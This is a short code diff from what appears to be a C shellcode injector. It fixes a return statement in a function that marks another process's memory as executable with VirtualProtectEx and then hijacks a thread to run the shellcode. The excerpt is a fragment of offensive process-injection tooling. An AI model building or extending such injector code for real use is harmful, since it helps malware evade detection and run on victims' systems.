@@ -122,7 +122,7 @@ void ExecuteShellcode0() {
 
     if (!VirtualProtectEx(hProcess, pAddress, shellcode_size, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
         printf("eepik fail");
-        return FALSE;
+        return;
     }
 
     HijackThread(hThread, pAddress);
